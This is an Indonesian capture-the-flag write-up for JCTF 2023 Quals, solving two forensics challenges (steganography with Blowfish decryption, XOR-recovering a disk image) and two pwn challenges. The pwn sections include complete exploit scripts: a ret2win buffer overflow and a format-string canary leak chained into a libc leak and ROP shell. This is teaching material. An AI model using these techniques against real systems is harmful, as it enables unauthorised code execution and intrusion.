+++
title = "JCTF 2023 Quals"
date = 2023-04-16
draft = false
categories = ["CTF Writeups", "Not Translated"]
tags = ["jctf", "forensic", "pwn", "writeup"]
summary = "Writeup tim CP Enjoyer untuk challenge Forensic (Dinosaur, Spartan Ghosts) dan Pwn (Book Store, Pass Manager) di JCTF 2023 babak kualifikasi."
+++

Writeup dari tim **CP Enjoyer** untuk JCTF 2023 Quals — hanya bagian **Forensik** (Dinosaur, Spartan Ghosts) dan **Pwn** (Book Store, Pass Manager).

---

# Forensik

## Dinosaur (100 pts)

{{< admonition quote "Deskripsi" >}}
The stegosaurus is one of the few creatures that likes to eat blowfish. The key of its favorable taste to a blowfish is dinosaur. It initializes his day by using blowfish. Although it wasn't the best food of the prehistoric era, the stegosaurus always leaves a FeedBack which until now, is still a Cipher for historians to crack. No phrases were used by historians to describe the extinct dinosaur.

By the way, stegosaurus likes to hide.
Stegosaurus... hide?

**Author:** Giga - Infinicus#6867

**Attachments:** `stegosaurus.jpg`
{{< /admonition >}}

### Analisis awal

Diberikan file `stegosaurus.jpg`.

{{< image src="dinosaur-stegosaurus.jpeg" caption="Gambar stegosaurus.jpg" height=400 >}}

Pada deskripsi soal, terdapat bagian "By the way, stegosaurus likes to hide. Stegosaurus... hide?" yang menandakan penggunaan `steghide`. Bagian "No phrases were used by historians to describe the extinct dinosaur." menandakan bahwa `steghide` tidak memerlukan password (atau bisa juga menandakan blowfish cipher di bawah tidak menggunakan padding). Walaupun sudah jelas dari deskripsi soal, melakukan `steghide` tanpa password adalah langkah pertama apabila diberi suatu file jpg.

{{< image src="dinosaur-steghide.png" caption="Berhasil mengekstrak file tersembunyi dengan steghide tanpa password" height=80 >}}

### Mendapatkan flag

Terdapat file `insides_of_stegosaurus.txt` yang di dalamnya terdapat kumpulan byte. Apabila di-unhex, tidak didapatkan apa-apa. Setelah kembali melihat deskripsi soal, bagian "The stegosaurus is one of the few creatures that likes to eat blowfish." menandakan ini merupakan cipher blowfish. Bagian "The key of its favorable taste to a blowfish is dinosaur." menandakan key-nya adalah `dinosaur`. Bagian "It initializes his day by using blowfish." menandakan iv-nya adalah `blowfish`. Dan bagian "...FeedBack which until now, is still a Cipher…" menandakan penggunaan mode CFB. Kami menggunakan https://www.lddgo.net/en/encrypt/blowfish untuk mendekripsi ciphertext tersebut.

{{< image src="dinosaur-blowfish-decrypt.png" caption="Dekripsi blowfish CFB pada lddgo.net" height=350 >}}
{{< image src="dinosaur-unhex-flag.png" caption="Unhex hasil dekripsi dan mendapatkan flag" height=70 >}}

> Flag: `JCTF2023{the_st364n0s4uru5_likes_bl0wf15h}`

## Spartan Ghosts (588 pts)

{{< admonition quote "Deskripsi" >}}
I heard some rumors about a demigod being worshipped by almost all of Greece. I heard he was from Sparta, a land of fierce warriors. Although, something bad happened there. Jota went there to find out more about this demigod, but there was nothing there. Jota only found this disk, which he believes is either encrypted, or corrupted. There was a label which says "EXCLUSIVE fOR [unreadable] ONLY. Contains the screams of the people that once lived here.".

Extract more information about this mysterious thing. Note: flag dalam lowercase.

**Author:** Giga - Infinicus#6867

**Attachments:** `spartan_disk`
{{< /admonition >}}

### Analisis awal

Diberikan sebuah file `spartan_disk` yang merupakan file data.

{{< image src="spartan-ghosts-file.png" caption="Identifikasi tipe file spartan_disk" >}}

Setelah dibuka dengan bless hex editor, kami menjumpai kata `godofwar` berulang-ulang.

{{< image src="spartan-ghosts-bless.png" caption="Isi spartan_disk pada bless hex editor" height=400 >}}

### Mendapatkan flag

Pada deskripsi soal, terdapat bagian "EXCLUSIVE fOR [unreadable] ONLY." menandakan untuk mendapatkan file aslinya, hanya diperlukan operasi xor. Saya kemudian mencari file signature untuk disk, dan file signature disk `.iso` menarik perhatian saya karena file signature-nya terdapat pada offset `0x8001`, `0x8801`, dan `0x9001` dan pada file `spartan_disk`, byte-byte pada offset tersebut sama. Kemudian saya kebingungan bagaimana mendapatkan key yang digunakan untuk xor. Saya awalnya coba xor byte-byte pada offset `0x8001` dengan file signature untuk mendapatkan key tapi justru berantakan pada offset `0x8801` dan `0x9001`. Singkat cerita, pada akhirnya saya melakukan xor dengan key `godofwar` untuk mendapatkan file disk asli. Berikut adalah scriptnya.

**solver.py**

```python
from pwn import *
key = b'godofwar'
f = open('spartan_disk', 'rb').read()
print(f[0x8001:0x8006])
print(f[0x8801:0x8806])
print(f[0x9001:0x9006])
new = xor(f, key)
print(new[0x8001:0x8006])
print(new[0x8801:0x8806])
print(new[0x9001:0x9006])
f_ = open('new.iso', 'wb')
f_.write(new)
```

Setelah nge-mount disk `new.iso`, terdapat 3 file di dalamnya. Terdapat file audio `cries_of_sparta`, file teks `history`, dan file jpeg `saviour`. File history berisi:

**history**

```text
Perched upon a hill so high,
Above a village peaceful and still,
Unleashed a force that made all cry,
Laying waste to homes and fields at will.
Screeches of pain, a deafening sound,
Tortured souls and broken dreams,
Ravaging through with no remorse found,
Eclipsing all that was serene.
The red sky was his sign of dread,
Conjuring death from his fiery shell,
Heralding destruction with every breath,
Every breath a fight, a battle to catch.
Death and destruction, a grave mismatch.
```

Huruf pertama pada setiap baris membentuk "paul stretched" yang menandakan bahwa file audio `cries_of_sparta` telah dimodifikasi menggunakan algoritme paulstretch. Kami kemudian mencari bagaimana cara membalikkan algoritme paulstretch ini untuk mendapatkan file audio asli, tapi tidak menemukan apa-apa. Akhirnya, kami mempercepat file audio `cries_of_sparta` menjadi 6x dan terdengar seseorang membacakan flag.

> Flag: `JCTF2023{dream_on_kratos}`

---

# Pwn

## Book Store (100 pts)

{{< admonition quote "Deskripsi" >}}
Just do some binary exploitation, replace the variable, replace the return address, get the flag

**Author:** BROP

**Attachments:** `vuln`

`nc 34.101.234.148 8128`
{{< /admonition >}}

### Analisis awal

Diberikan suatu file `vuln` yang merupakan binary 32-bit, dynamically linked, not stripped, pie mati dan canary gaada.

{{< image src="book-store-checksec.png" caption="Hasil checksec pada binary vuln" height=160 >}}

Setelah di-decompile, terdapat banyak fungsi (pff mager beut). Pada `reqBook` terdapat vulnerability buffer overflow.

{{< image src="book-store-decompile.png" caption="Potongan kode reqBook yang rentan buffer overflow" height=350 >}}

Fungsi `scanf` di atas hanya akan berhenti membaca input sampai karakter new line, sehingga dapat terjadi buffer overflow pada `s`. Ok, terdapat buffer overflow… berarti kita bisa overwrite eip dong? Iya, tapi apabila `v2` tidak sama dengan `312561891`, fungsi di atas tidak akan pernah sampai pada perintah return. Sehingga, kita harus mengubah `v2` menjadi `312561891`. Selain itu, panjang string kita tidak boleh lebih dari `0x32`… menurut `strlen`. Kita dapat bypass `strlen` dengan memberi input null byte sebelum karakter ke-50 (`0x32`) kita karena `strlen` hanya akan membaca string sampai null byte. Maka, payload kami adalah null byte sampai offset `v2`, kemudian `312561891` dalam 32-bit little endian, 4 random byte untuk ebp, dan terakhir alamat fungsi `secretBook` yang merupakan fungsi win untuk ngeprint flag. Berikut adalah solver kami.

### Mendapatkan flag

**solve.py**

```python
#!/usr/bin/env python3
from pwn import *
import sys

exe = ELF("./vuln")
context.binary = exe
context.log_level = 'debug'

cmd = """
b *main
bp 0x080493cd
c
"""

def conn():
    if 'g' in sys.argv or 'gdb' in sys.argv:
        r = process([exe.path])
        gdb.attach(r, cmd)
    elif 'l' in sys.argv or 'local' in sys.argv:
        r = process([exe.path])
    else:
        r = remote('34.101.234.148', 8128)
    return r

def main():
    r = conn()
    rop = ROP(exe)
    payload = b'\x00'*50 + p32(312561891) + b'b'*4 + p32(exe.sym.secretBook) # win function
    r.sendlineafter(b'choice: ', b'4')
    r.sendlineafter(b'Book: ', payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

{{< image src="book-store-flag.png" caption="Berhasil mendapatkan flag" >}}

> Flag: `JCTF2023{ur_ret2w1n_5ecr3t_b00k_i5_h3re}`

## Pass Manager (550 pts)

{{< admonition quote "Deskripsi" >}}
Krint make a password manager, not like his bookstore he put some security there, Krint believes in that security so he stores his password there.

**Author:** BROP

**Attachments:** `vuln`, `libc.so.6`

`nc 34.101.234.148 8312`
{{< /admonition >}}

### Analisis awal

Diberikan file `vuln`, `libc`, dan `ld`. File `vuln` adalah binary 32-bit, dynamically linked, stripped, pie mati dan ada canary.

{{< image src="pass-manager-checksec.png" caption="Hasil checksec pada binary vuln" height=170 >}}

Kami menggunakan `pwninit` agar binary `vuln` langsung di patch dengan `libc` dan `ld` yang diberikan. Setelah di-decompile, terdapat banyak beut fungsi (pff mager beutttt) dan terdapat vulnerability format string dan buffer overflow pada fungsi `addPassword`.

{{< image src="pass-manager-decompile.png" caption="Potongan kode fungsi addPassword" height=450 >}}

Input yang disimpan di dalam variabel `format` akan langsung di `printf` sehingga dapat terjadi format string attack, dan pada `scanf` ke-2, terdapat buffer overflow seperti pada soal Book Store. Plan of attacknya simpel, kita leak canary pada `scanf` pertama, kemudian kita melakukan buffer overflow pada `scanf` ke-2 untuk overwrite eip. Maka, pertama kami membuat script `fuzz.py` untuk mencari offset canary.

**fuzz.py**

```python
from pwn import *
context.log_level = 'critical'
for i in range(1,100):
    #r = process('./_vuln')
    r = remote('34.101.234.148', 8312)
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'name: ', b'%' + str(i).encode() + b'$llx')
    r.recvuntil(b'you ')
    leak = r.recvline().strip().decode()
    print(i, leak)
```

### Mendapatkan shell

Setelah men-double check dengan gdb, canary terdapat pada offset 23. Maka, payload kami adalah padding null byte (untuk bypass `strlen`) sampai canary, canary yang tadi sudah di-leak, padding 8 byte ke eip, alamat fungsi `puts`, alamat fungsi `add_password`, dan alamat got dari fungsi `puts`. Kita akan nge-leak fungsi `puts` pada libc. Alamat fungsi `add_password` di sini diperlukan karena setelah nge-leak alamat fungsi `puts` pada libc, kita kembali mengirim payload untuk mendapatkan shell menggunakan fungsi `system` di libc atau menggunakan syscall. Berikut adalah solver kami.

**solve.py**

```python
#!/usr/bin/env python3
from pwn import *
import sys

exe = ELF("./_vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.binary = exe
context.log_level = 'debug'

cmd = """
b *main
b *store_pass
bp 0x080493ae
bp 0x0804941b
c
"""

def conn():
    if 'g' in sys.argv or 'gdb' in sys.argv:
        r = process([exe.path])
        gdb.attach(r, cmd)
    elif 'l' in sys.argv or 'local' in sys.argv:
        r = process([exe.path])
    else:
        r = remote('34.101.234.148', 8312)
    return r

def main():
    r = conn()
    rop = ROP(exe)
    payload = flat()
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'name: ', b'%23$llx')
    r.recvuntil(b'you ')
    canary = bytes.fromhex(r.recvline().strip().decode())[::-1]
    puts_got = exe.got.puts
    puts_plt = exe.sym.puts
    payload = flat(b'\x00'*32, canary, b'b'*8, puts_plt, exe.sym.add_password, puts_got)
    r.sendlineafter(b'password: ', payload)
    puts_libc = u32(r.recvline()[:4])
    print(hex(puts_libc))
    libc.address = puts_libc - libc.sym.puts
    binsh = p32(libc.address + 0x001b90f5)
    pop_eax = p32(next(libc.search(asm('pop eax; ret;'), executable=True)))
    pop_ebx = p32(next(libc.search(asm('pop ebx; ret;'), executable=True)))
    pop_ecx_edx = p32(libc.address + 0x000371c3)
    syscall = p32(libc.address + 0x00037585)
    payload = b'\x00'*32 + canary + b'b'*8 + pop_ebx + binsh + pop_ecx_edx + p32(0) + p32(0) + pop_eax + p32(0xb) + syscall
    r.sendlineafter(b'name: ', b'%23$llx')
    r.recvuntil(b'you ')
    canary = bytes.fromhex(r.recvline().strip().decode())[::-1]
    r.sendlineafter(b'password: ', payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Setelah mendapatkan shell, kita dapatkan `myPass.txt` isinya adalah base64 dari flag.

{{< image-row height=250 >}}
{{< image src="pass-manager-mypass.png" caption="Membaca myPass.txt yang berisi base64 flag" >}}
{{< image src="pass-manager-flag.png" caption="Decode base64 dan mendapatkan flag" >}}
{{< /image-row >}}

> Flag: `JCTF2023{just_some_s3cur1ty_byp45s_r1ght?}`
